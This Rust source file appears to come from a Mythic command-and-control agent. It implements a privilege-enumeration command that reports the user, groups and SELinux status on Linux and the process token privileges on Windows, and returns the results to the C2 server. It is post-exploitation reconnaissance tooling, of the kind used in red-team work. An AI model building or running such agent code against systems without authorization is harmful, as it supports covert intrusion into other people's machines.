use crate::agent::AgentTask;
use crate::mythic_success;
use std::error::Error;
use std::result::Result;

#[cfg(target_os = "linux")]
use crate::utils::linux::whoami;

#[cfg(target_os = "windows")]
use crate::utils::windows::{whoami, Handle};

/// Get the privileges of the current process
/// Retrieves the following information:
/// - User: username(uid)
/// - Group: groupname(gid)
/// - GroupMemberships: groupname(gid)
///
/// Arguments:
/// * `task` - Tasking information
#[cfg(target_os = "linux")]
pub fn get_privileges(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    use std::io::{BufRead, Read};

    // Import the linux utils
    use crate::utils::linux;

    // Get the current user
    let mut user = whoami::username()
        .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::Other, "Failed to get username"))?;

    // Start formulating the response output
    let mut output = format!(
        "Privileges for '{}' on '{}'\n\n",
        whoami::username().unwrap_or_else(|| "unknown".to_string()),
        whoami::hostname().unwrap_or_else(|| "unknown".to_string()),
    );

    // Grab the current uid
    let uid = unsafe { libc::getuid() };
    output.push_str(format!("User: {}({})\n", user, uid).as_str());

    // Grab the current gid
    let gid = unsafe { libc::getgid() };
    output.push_str(
        format!(
            "Group: {}({})\n\n",
            linux::get_group_from_gid(gid).unwrap_or_default(),
            gid
        )
        .as_str(),
    );

    user.push('\0');

    // Get the other group information associated with this callback
    let mut ngroups = 0;
    unsafe {
        libc::getgrouplist(
            user.as_ptr().cast(),
            gid,
            std::ptr::null_mut(),
            &mut ngroups,
        )
    };

    // Check if the `grouplist` libc call returned more than 0 groups
    if ngroups > 0 {
        output.push_str("Group Memberships:\n");

        // Create a buffer to hold the group information
        let mut groups = vec![0; ngroups.try_into().unwrap_or(32)];

        // Query `getgrouplist` again to get the group information
        if unsafe {
            libc::getgrouplist(user.as_ptr().cast(), gid, groups.as_mut_ptr(), &mut ngroups)
        } >= 0
        {
            // Iterate over each group appending the information to the output
            for group in groups {
                output.push_str(
                    format!(
                        "{}({})\n",
                        linux::get_group_from_gid(group).unwrap_or_default(),
                        group
                    )
                    .as_str(),
                );
            }
        }
    }

    // Check if the agent is on an SELinux kernel
    if std::path::Path::new("/sys/fs/selinux").exists() {
        output.push_str("\nSELinux:\n");

        output.push_str("status: Enabled\n");

        // Grab the SELinux enforcing information
        if let Ok(mut f) = std::fs::File::open("/sys/fs/selinux/enforce") {
            let mut mode = String::new();
            let _ = f.read_to_string(&mut mode);

            match mode.parse::<i32>() {
                Ok(0) => output.push_str("enforce: Permissive\n"),
                Ok(1) => output.push_str("enforce: Enforcing\n"),
                _ => output.push_str("enforce: unknown\n"),
            }
        } else {
            output.push_str("enforce: unknown\n");
        }

        // Grab the SELinux policy
        if let Ok(f) = std::fs::File::open("/etc/selinux/config") {
            let reader = std::io::BufReader::new(f);
            for line in reader.lines().flatten() {
                if line.starts_with("SELINUXTYPE=") {
                    let policy = line.split('=').last().unwrap();
                    output.push_str(format!("policy: {}\n", policy).as_str());
                }
            }
        } else {
            output.push_str("policy: unknown\n");
        }

        // Grab the current SELinux context for the agent
        if let Ok(mut context) = std::fs::read_to_string("/proc/thread-self/attr/current") {
            context.pop().unwrap();
            output.push_str(format!("user context: {}\n", context).as_str());
        }
    }

    output = output.trim_end_matches('\n').to_string();

    // Send the output to Mythic
    Ok(mythic_success!(task.id, output))
}

/// Get the privileges of the current process for windows
/// Arguments:
/// * `task` - Tasking information
#[cfg(target_os = "windows")]
pub fn get_privileges(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    use windows::{
        core::{PCSTR, PSTR},
        Win32::{
            Foundation::{ERROR_INSUFFICIENT_BUFFER, HANDLE},
            Security::{
                GetTokenInformation, LookupPrivilegeNameA, TokenPrivileges, LUID_AND_ATTRIBUTES,
                TOKEN_PRIVILEGES, TOKEN_QUERY,
            },
            System::Threading::{GetCurrentProcess, OpenProcessToken},
        },
    };

    // Create the initial output
    let mut output = format!(
        "Privileges for '{}' on '{}'\n\n",
        whoami::username().unwrap_or_else(|| "unknown".to_string()),
        whoami::hostname().unwrap_or_else(|| "unknown".to_string()),
    );

    // Get a handle to the current process
    let mut t_handle = HANDLE::default();
    unsafe { OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut t_handle)? };
    let t_handle = Handle::from(t_handle);

    // Get the token information length
    let mut priv_len = 0u32;
    match unsafe { GetTokenInformation(*t_handle, TokenPrivileges, None, 0, &mut priv_len) } {
        Err(e) if e == ERROR_INSUFFICIENT_BUFFER.into() => (),
        Err(e) => return Err(Box::new(windows::core::Error::from(e))),
        _ => unreachable!(),
    };

    let mut privs: Vec<u8> = Vec::new();
    privs.resize(priv_len as usize, 0);

    // Get the token information
    unsafe {
        GetTokenInformation(
            *t_handle,
            TokenPrivileges,
            Some(privs.as_mut_ptr().cast()),
            priv_len,
            &mut priv_len,
        )
    }?;

    let privileges: &mut TOKEN_PRIVILEGES = unsafe { &mut *privs.as_mut_ptr().cast() };
    let count = privileges.PrivilegeCount;

    // Get the array of LUIDs
    let luids: &mut [LUID_AND_ATTRIBUTES] = unsafe {
        std::slice::from_raw_parts_mut(privileges.Privileges.as_mut_ptr(), count as usize)
    };

    let mut cch_name = [0u8; 512];
    let mut cch_name_size: u32 = cch_name.len() as u32;

    // Iterate over each LUID mapping it to a Windows privilege
    for luid in luids.iter_mut() {
        if let Ok(_) = unsafe {
            LookupPrivilegeNameA(
                PCSTR::null(),
                &mut luid.Luid,
                PSTR(cch_name.as_mut_ptr()),
                &mut cch_name_size,
            )
        } {
            output.push_str(
                format!("{}\n", unsafe {
                    std::ffi::CStr::from_ptr(cch_name.as_ptr().cast())
                        .to_str()
                        .unwrap()
                })
                .as_str(),
            );

            cch_name.fill(0);
            cch_name_size = cch_name.len() as u32;
        }
    }

    // Return the output
    output = output.trim_end_matches('\n').to_string();
    Ok(mythic_success!(task.id, output))
}
